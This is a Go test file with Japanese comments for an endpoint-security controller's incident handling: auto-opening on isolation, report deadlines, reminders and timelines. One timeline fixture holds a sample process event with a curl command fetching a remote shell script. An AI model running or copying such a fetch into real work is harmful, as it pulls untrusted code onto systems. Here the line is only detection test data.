package controller

import (
	"encoding/json"
	"net/http"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"

	"susanoo/internal/api"
	"susanoo/internal/event"
	"susanoo/internal/pki"
	"susanoo/internal/pki/pkitest"
	"susanoo/internal/policy"
)

func (f *fixture) incidents(admin *peer, all bool) []api.Incident {
	f.t.Helper()
	path := api.PathIncidents
	if all {
		path += "?all=1"
	}
	status, body := admin.do(http.MethodGet, path, nil)
	if status != http.StatusOK {
		f.t.Fatalf("インシデントの一覧 = %d %s", status, body)
	}
	var list []api.Incident
	json.Unmarshal(body, &list)
	return list
}

func stepOf(inc api.Incident, id string) api.IncidentStep {
	for _, s := range inc.Steps {
		if s.ID == id {
			return s
		}
	}
	return api.IncidentStep{}
}

// 隔離するとインシデントを自動で開き、切り離しと復旧は台帳の状態から済みにする。開いているうちは、同じ対象の隔離で使い回す。
func TestIncidentOpensOnIsolation(t *testing.T) {
	h, n := newHookNotifier(t)
	f := startNotify(t, pkitest.New(t), t.TempDir(), testPolicy(policy.ResponseEnforce, false), nil, nil, n)
	pc := f.peer(pki.RoleClient, "pc-001")
	admin := f.peer(pki.RoleAdmin, "admin")
	pc.heartbeat()
	pc.touchHoneytoken()

	list := f.incidents(admin, false)
	if len(list) != 1 {
		t.Fatalf("インシデント = %+v", list)
	}
	inc := list[0]
	if !regexp.MustCompile(`^INC-\d{8}-001$`).MatchString(inc.ID) || !slices.Equal(inc.Devices, []string{"pc-001"}) || inc.Status != api.IncidentOpen ||
		!strings.Contains(inc.Title, ReasonHoneytoken) || inc.OpenedBy != actorSystem || !inc.KnownAt.Equal(inc.Opened) {
		t.Errorf("インシデント = %+v", inc)
	}
	if s := stepOf(inc, "isolate"); s.Status != api.StepDone || s.By != actorSystem || !s.Auto {
		t.Errorf("切り離し = %+v", s)
	}
	if s := stepOf(inc, "evidence"); s.Status != api.StepTodo {
		t.Errorf("証拠の保全（証拠はまだない）= %+v", s)
	}
	if len(inc.Steps) != len(incidentSteps) || stepOf(inc, "communication").Guide == "" || !strings.Contains(stepOf(inc, "communication").Guide, "折り返し") {
		t.Errorf("手順 = %+v", inc.Steps)
	}
	// 隔離の通知に、インシデントの ID を添える。
	b := h.wait(t, "isolate")
	if fields, _ := b["fields"].(map[string]any); fields["インシデント"] != inc.ID {
		t.Errorf("隔離の通知 = %v", b)
	}

	admin.do(http.MethodPost, api.PathDevices+"/pc-001/release", nil)
	if s := stepOf(f.incidents(admin, false)[0], "release"); s.Status != api.StepDone {
		t.Errorf("復旧 = %+v", s)
	}
	// 解除しても切り離しは済みのまま。同じ対象をまた隔離すると、開いているインシデントを使う。
	pc.heartbeat()
	admin.do(http.MethodPost, api.PathDevices+"/pc-001/isolate", nil)
	list = f.incidents(admin, false)
	if len(list) != 1 || stepOf(list[0], "isolate").Status != api.StepDone {
		t.Errorf("隔離し直した後のインシデント = %+v", list)
	}
}

func TestIncidentLifecycle(t *testing.T) {
	f := start(t, pkitest.New(t), t.TempDir(), testPolicy(policy.ResponseEnforce, false))
	pc := f.peer(pki.RoleClient, "pc-001")
	admin := f.peer(pki.RoleAdmin, "admin")
	pc.heartbeat()

	known := f.clock.now().Add(-6 * time.Hour)
	for name, tc := range map[string]struct {
		req  api.IncidentOpenRequest
		want int
	}{
		"題名がない":    {api.IncidentOpenRequest{Devices: []string{"pc-001"}}, http.StatusBadRequest},
		"対象がない":    {api.IncidentOpenRequest{Title: "x"}, http.StatusBadRequest},
		"台帳にない対象":  {api.IncidentOpenRequest{Title: "x", Devices: []string{"pc-999"}}, http.StatusNotFound},
		"知った時刻が未来": {api.IncidentOpenRequest{Title: "x", Devices: []string{"pc-001"}, KnownAt: f.clock.now().Add(time.Hour)}, http.StatusBadRequest},
	} {
		if status, body := admin.do(http.MethodPost, api.PathIncidents, tc.req); status != tc.want {
			t.Errorf("%s の応答 = %d %s", name, status, body)
		}
	}
	status, body := admin.do(http.MethodPost, api.PathIncidents, api.IncidentOpenRequest{
		Title: "不審なメールの添付を開いた", Devices: []string{"pc-001"}, KnownAt: known, Note: "利用者からの申告",
	})
	var inc api.Incident
	json.Unmarshal(body, &inc)
	if status != http.StatusOK || inc.OpenedBy != "admin/admin" || !inc.KnownAt.Equal(known) || len(inc.Notes) != 1 || len(inc.Deadlines) != 0 {
		t.Fatalf("開いたインシデント = %d %+v", status, inc)
	}
	path := api.PathIncidents + "/" + inc.ID

	// 個人情報の漏えい等のおそれがあると、速報（3〜5 日）と確報（30 日）の期限の目安を付ける。
	yes := true
	status, body = admin.do(http.MethodPost, path, api.IncidentUpdate{PersonalData: &yes, Note: "顧客の一覧が端末にあった"})
	json.Unmarshal(body, &inc)
	if status != http.StatusOK || len(inc.Deadlines) != 2 || len(inc.Notes) != 2 {
		t.Fatalf("更新後 = %d %+v", status, inc)
	}
	prelim, final := inc.Deadlines[0], inc.Deadlines[1]
	if prelim.Name != "速報" || !prelim.From.Equal(known.Add(72*time.Hour)) || !prelim.Due.Equal(known.Add(120*time.Hour)) ||
		final.Name != "確報" || !final.Due.Equal(known.Add(30*24*time.Hour)) {
		t.Errorf("期限 = %+v", inc.Deadlines)
	}
	// 不正の目的によるおそれがあると、確報は 60 日。速報を記録すると済みになる。
	reported := f.clock.now()
	_, body = admin.do(http.MethodPost, path, api.IncidentUpdate{Malicious: &yes, PrelimReported: &reported})
	json.Unmarshal(body, &inc)
	if !inc.Deadlines[1].Due.Equal(known.Add(60*24*time.Hour)) || !inc.Deadlines[0].Done.Equal(reported) {
		t.Errorf("期限 = %+v", inc.Deadlines)
	}
	// 全体の状態には、報告していない最も近い期限を載せる。
	_, body = admin.do(http.MethodGet, api.PathStatus, nil)
	var st api.Status
	json.Unmarshal(body, &st)
	if st.Incidents.Open != 1 || st.Incidents.Next == nil || st.Incidents.Next.Name != "確報" || st.Incidents.Next.Incident != inc.ID {
		t.Errorf("全体の状態のインシデント = %+v", st.Incidents)
	}

	// 手順の状態を変える。
	if status, _ := admin.do(http.MethodPost, path+"/steps/nonexistent", api.StepUpdate{Status: api.StepDone}); status != http.StatusNotFound {
		t.Errorf("ない手順の応答 = %d", status)
	}
	if status, _ := admin.do(http.MethodPost, path+"/steps/credentials", api.StepUpdate{Status: "finished"}); status != http.StatusBadRequest {
		t.Errorf("不正な状態の応答 = %d", status)
	}
	_, body = admin.do(http.MethodPost, path+"/steps/credentials", api.StepUpdate{Status: api.StepDone, Note: "メールと VPN のパスワードを変更"})
	json.Unmarshal(body, &inc)
	if s := stepOf(inc, "credentials"); s.Status != api.StepDone || s.By != "admin/admin" || s.Note == "" {
		t.Errorf("認証情報の変更 = %+v", s)
	}

	// 閉じると一覧（既定）から消え、?all=1 で見える。操作は監査ログに残る。
	admin.do(http.MethodPost, path, api.IncidentUpdate{Status: api.IncidentClosed})
	if len(f.incidents(admin, false)) != 0 || len(f.incidents(admin, true)) != 1 || f.incidents(admin, true)[0].Closed.IsZero() {
		t.Errorf("閉じた後の一覧 = %+v", f.incidents(admin, true))
	}
	if status, _ := admin.do(http.MethodPost, path, api.IncidentUpdate{Status: "archived"}); status != http.StatusBadRequest {
		t.Errorf("不正な状態の応答 = %d", status)
	}
	actions := auditActions(t, f.dir)
	for _, want := range []string{ActionIncidentOpen + ":" + inc.ID, ActionIncidentUpdate + ":" + inc.ID, ActionIncidentStep + ":" + inc.ID} {
		if !slices.Contains(actions, want) {
			t.Errorf("監査ログに %s がありません: %v", want, actions)
		}
	}
	// 再起動しても残る。
	f.stop()
	g := start(t, f.env, f.dir, testPolicy(policy.ResponseEnforce, false))
	if list := g.incidents(g.peer(pki.RoleAdmin, "admin"), true); len(list) != 1 || stepOf(list[0], "credentials").Status != api.StepDone {
		t.Errorf("再起動後 = %+v", list)
	}
}

// 報告していない期限は、速報は目安の期間に入ったら、確報は 3 日前から知らせ、過ぎたらもう一度知らせる。同じ知らせは 1 回だけ。
func TestIncidentDeadlineReminders(t *testing.T) {
	h, n := newHookNotifier(t)
	f := startNotify(t, pkitest.New(t), t.TempDir(), testPolicy(policy.ResponseEnforce, false), nil, nil, n)
	f.peer(pki.RoleClient, "pc-001").heartbeat()
	admin := f.peer(pki.RoleAdmin, "admin")
	_, body := admin.do(http.MethodPost, api.PathIncidents, api.IncidentOpenRequest{Title: "漏えいの疑い", Devices: []string{"pc-001"}, PersonalData: true})
	var inc api.Incident
	json.Unmarshal(body, &inc)

	count := func(substr string) int {
		h.mu.Lock()
		defer h.mu.Unlock()
		n := 0
		for _, b := range h.bodies {
			if b["kind"] == "incident" && strings.Contains(b["title"].(string), substr) {
				n++
			}
		}
		return n
	}
	f.ctrl.checkIncidentDeadlines()
	f.clock.advance(73 * time.Hour)
	f.ctrl.checkIncidentDeadlines()
	f.ctrl.checkIncidentDeadlines()
	waitFor(t, "速報の期限が近い知らせ", func() bool { return count("速報の期限の目安") == 1 })
	f.clock.advance(48 * time.Hour)
	f.ctrl.checkIncidentDeadlines()
	waitFor(t, "速報の期限を過ぎた知らせ", func() bool { return count("速報の期限の目安") == 2 && count("過ぎました") == 1 })
	f.clock.advance(25 * 24 * time.Hour) // 確報の期限（30 日）の 3 日前を過ぎる
	f.ctrl.checkIncidentDeadlines()
	waitFor(t, "確報の期限が近い知らせ", func() bool { return count("確報の期限の目安") == 1 })
	time.Sleep(50 * time.Millisecond)
	if got := count("期限の目安"); got != 3 {
		t.Errorf("知らせ = %d 件（%v）", got, h.bodies)
	}
}

func waitFor(t *testing.T, what string, cond func() bool) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for !cond() {
		if time.Now().After(deadline) {
			t.Fatalf("%s を待ちきれない", what)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// 時系列は、対象のイベント（既定は検知結果）、監査ログ、証拠を時刻の順に並べる。
func TestIncidentTimeline(t *testing.T) {
	f := start(t, pkitest.New(t), t.TempDir(), testPolicy(policy.ResponseEnforce, false))
	f.clock.advance(time.Since(f.clock.now())) // 監査ログは実際の時刻で記録するので、試験の時計を今に合わせる
	pc := f.peer(pki.RoleClient, "pc-001")
	admin := f.peer(pki.RoleAdmin, "admin")
	pc.heartbeat()
	send := func(e *event.Event) {
		if status, body := pc.do(http.MethodPost, api.PathEvents, api.EventBatch{Events: []event.Event{*e}}); status != http.StatusOK {
			t.Fatalf("イベントの送信 = %d %s", status, body)
		}
	}
	proc := event.New(event.ClassProcessActivity, event.ProcessLaunch, event.SeverityInformational, f.clock.now().Add(-time.Minute))
	proc.Device = &event.Device{}
	proc.Process = &event.Process{PID: 7, Name: "curl", CmdLine: "curl http://203.0.113.9/x.sh"}
	send(proc)
	pc.touchHoneytoken() // 隔離してインシデントを開く
	f.clock.advance(time.Since(f.clock.now()) + time.Second)

	inc := f.incidents(admin, false)[0]
	get := func(query string) []api.TimelineEntry {
		status, body := admin.do(http.MethodGet, api.PathIncidents+"/"+inc.ID+"/timeline"+query, nil)
		if status != http.StatusOK {
			t.Fatalf("時系列 = %d %s", status, body)
		}
		var out []api.TimelineEntry
		json.Unmarshal(body, &out)
		return out
	}
	tl := get("")
	has := func(entries []api.TimelineEntry, source, kind string) bool {
		return slices.ContainsFunc(entries, func(e api.TimelineEntry) bool { return e.Source == source && e.Kind == kind })
	}
	if !has(tl, "event", "finding:honeytoken") || !has(tl, "audit", ActionIsolate) || !has(tl, "audit", ActionIncidentOpen) || has(tl, "event", "process") {
		t.Errorf("時系列（検知結果だけ）= %+v", tl)
	}
	if !slices.IsSortedFunc(tl, func(a, b api.TimelineEntry) int { return a.Time.Compare(b.Time) }) {
		t.Error("時系列が時刻の順でない")
	}
	if all := get("?all=1"); !has(all, "event", "process") {
		t.Errorf("時系列（すべて）= %+v", all)
	}
	if status, _ := admin.do(http.MethodGet, api.PathIncidents+"/"+inc.ID+"/timeline?before=9999h", nil); status != http.StatusBadRequest {
		t.Errorf("範囲が長すぎるときの応答 = %d", status)
	}
	if status, _ := admin.do(http.MethodGet, api.PathIncidents+"/INC-00000000-000/timeline", nil); status != http.StatusNotFound {
		t.Errorf("ないインシデントの応答 = %d", status)
	}
}
